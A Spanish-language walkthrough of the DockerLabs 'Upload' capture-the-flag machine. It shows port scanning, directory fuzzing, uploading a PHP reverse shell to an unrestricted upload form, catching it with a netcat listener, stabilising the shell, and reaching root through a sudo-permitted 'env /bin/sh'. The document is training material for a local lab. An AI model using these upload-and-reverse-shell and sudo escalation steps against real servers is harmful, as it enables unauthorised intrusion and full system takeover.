## WRITEUP DE LA MAQUINA UPLOAD DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos con la herramienta Nmap para ver cuales estan abiertos y que servicios y caraterísiticas muestran.
```shell
└─$ nmap -sC -sV -p- -n --min-rate 5000 172.17.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br>
"-p-" Escanea todos los 65535 puertos TCP.
<br>
"-n" Desactiva la resolución de nombres DNS.
<br>
"--min-rate 5000" Ajusta la tasa mínima de envío de paquetes a 5000 paquetes por segundo, acelerando el escaneo.
<br>
"172.17.0.2" Es la dirección IP de la máquina víctima.
<br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 11:11 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000094s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
```
Observamos que el puerto 80 del servicio http esta abierto, por ello al ser el unico puerto abierto por lógica intentaremos escalar por ahí. En cualquier buscador ponemos la dirección ip, en este caso 172.17.0.2, nos muestra una pagina web donde se puede subir archivos:
<br><br>
![pagina web upload](https://github.com/1A2N6K7/DockerLabs-WriteUps/assets/94070438/8206ef47-d953-4249-8299-602b767cd7ec)
<br><br><br>
Aqui se dispersa la cosa, ya que vamos a tirar por acceder a la máquina víctima subiendo un archivo php que contenga una reverse shell, para ello hay muchas formas, todas se parecen en ciertas cosas, pero en este caso la voy a hacer de una manera muy sencilla.
<br>
Pero antes de comenzar con la reverse shell, hay que averiguar donde se encuentra y como se llama el directorio donde se alamecenan los archivos que subamos.
<br>
Para ello vamos a hacer fuzzing con la herramienta gobuster (se puede hacer igual con herramientas como wfuzz entre otras)
```
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
El modo dir indica que Gobuster realizará una enumeración de directorios y archivos.
<br>
"-u" Especifica la URL del objetivo que Gobuster escaneará. En este caso, el objetivo es http://172.17.0.2/.
<br>
"-w" Especifica la lista de palabras (wordlist) que Gobuster usará para la fuerza bruta. La lista de palabras contiene nombres de directorios y archivos comunes que Gobuster intentará encontrar en el servidor web. Aquí se está utilizando una lista de palabras proporcionada por DirBuster, llamada directory-list-2.3-medium.txt.
<br>
"-x" Especifica las extensiones de archivos que Gobuster intentará agregar a cada entrada en la lista de palabras. En este caso, Gobuster probará cada palabra con las extensiones .php Esto significa que si una entrada en la lista de palabras es admin, Gobuster probará admin.php

```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
Progress: 45155 / 441122 (10.24%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 48897 / 441122 (11.08%)
===============================================================
Finished
===============================================================
```
Observamos que nos saca un directorio que destaca, ya que encima muestra un enlace, hablamos del directorio "172.17.0.2/uploads/". Una vez llegados aqui volvemos al tema de la reverse shell, ahora si.
Vamos a la pagina https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php y descargamos el archivo php, lo abrimos en la terminal con alguna herramientas de edicion de texto como nano. Hay dos lineas donde pone "CHANGE THIS" ahi deberias poner la ip de vuestra máquina anfitriona y el puerto:
<br><br>
![Foto del codigo de reverse shell](https://github.com/1A2N6K7/DockerLabs-WriteUps/assets/94070438/93e2497c-8348-4a03-8ff0-9c37807ef8bb)
<br><br>
Subimos este archivo a la pagina víctima. <br>Para estar seguros de que se ha subido, con esta url  "172.17.0.2/uploads/" veremos que se encuentra el archivo almacenado:
<br><br>
![direcotrio por fuzzing](https://github.com/1A2N6K7/DockerLabs-WriteUps/assets/94070438/5c766129-42b5-4bc2-a2b3-48d6d08996ad)
<br><br>
Antes de ejecutar la reverse shell, tenemos que ejecutar la herramienta netcat para ponernos en escucha, siempre hay que poner obviamente el mismo puerto que hemos puesto anteriormente en el archivo php que hemos editado:

```shell
└─$ nc -lvnp 4444                       
listening on [any] 4444 ...
```
"nc" es la abreviatura de netcat, una herramienta de red que se puede usar para leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP.
<br>
-l: Espere conexiones entrantes en lugar de intentar conectarse a otro sistema.
<br>
-v: Muestre información detallada sobre lo que está sucediendo.
<br>
-n: No realice la resolución de nombres de host, solo use direcciones IP.
<br>
-p 4444: Escuche en el puerto 4444
<br><br>
Una vez estamos en escucha, en la url escribimos el nombre del archivo "172.17.0.2/uploads/php-reverse-shell.php", la pagina deberia quedarse en blanco cargando:

```shell
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 41216
Linux 4419c3b05405 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
 17:55:13 up  6:18,  0 users,  load average: 0.34, 0.41, 0.30
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
Ya somos el usuario "www-data", la idea es llegar a ser root pero antes de esto, debemos hacer el llamado "tratamiento de terminal", se refiere a mejorar la funcionalidad y usabilidad de la shell que has obtenido. Ya que cuando te conectas a una máquina víctima a través de una reverse shell, es común que la sesión no se comporte como una terminal interactiva completa. Esto puede limitar tu capacidad para usar ciertos comandos.
<br><br>
Tratamiento de terminal paso a paso:
<br><br>
1 - "script /dev/null -c bash" - El comando script inicia una sesión de terminal grabada en el archivo especificado (/dev/null en este caso, que descarta la salida). La opción -c bash ejecuta bash dentro de esta sesión.

```shell
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@4419c3b05405:/$ 
```
2 - "Control + z" - Suspende temporalmente la sesión de la shell actual y devuelve el control al shell principal, para poner la sesion en segundo plano.
<br><br>
3 - "stty raw -echo; fg" - Configura la terminal para que pase las entradas crudas (raw) y desactiva el eco (-echo), lo que significa que los caracteres que escribes no se mostrarán. Esto mejora la interacividad de la shell.

```shell
└─$ stty raw -echo; fg

[1]  + continued  nc -lvnp 4444
```
4 - "reset xterm" - Debido al paso anterior parece que la terminal se ha rayado, pero no, hay que ejecutar "reset xterm" aunque el cursor este en medio de la terminal.Este comando  restablece la terminal a sus valores predeterminados, conseguimos limpiar y reconfigura la terminal para que funcione correctamente.
<br><br>
5 - "export TERM=xterm" - Establece la variable de entorno TERM a xterm, lo que informa a los programas terminales sobre el tipo de terminal que estás usando. Conseguimos que la terminal interprete correctamente los comandos y el formato de salida.

```shell
www-data@4419c3b05405:/$ export TERM=xterm
```
6 - "export SHELL=bash" - Establece la variable de entorno SHELL a bash, lo que informa al sistema que estás utilizando bash como shell. Puede ayudar a algunos programas y scripts a comportarse correctamente, asumiendo que bash es tu shell.

```shell
www-data@4419c3b05405:/$ export SHELL=bash
```
Una vez hemos completado el "tratamiento de terminal" toca escalar privilegios. Escribimos el comando "sudo -l" el cual  permite a un usuario verificar qué comandos tienen permiso para ejecutar como superusuario (o cualquier otro usuario especificado).
<br>

```shell
www-data@4419c3b05405:/$ sudo -l
Matching Defaults entries for www-data on 4419c3b05405:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 4419c3b05405:
    (root) NOPASSWD: /usr/bin/env
```
Esta linea es la que nos interesa "(root) NOPASSWD: /usr/bin/env": significa que el usuario puede ejecutar el comando /usr/bin/env con privilegios de superusuario (root) sin necesidad de proporcionar una contraseña.
<br>
Para escalar privilegios nos aprovecharemos de "/usr/bin/env" para ser root, para ello nos metemos en la pagina https://gtfobins.github.io/#env y en la opcion de "env" pinchamos en el recuadro de "Sudo", copiamos el comando que nos aparece "sudo env /bin/sh" y ejecutamos.

```shell
www-data@4419c3b05405:/$ sudo env /bin/sh
# whoami
root
# 
```
Ya esta, estamos dentro, somos root, muchas gracias.
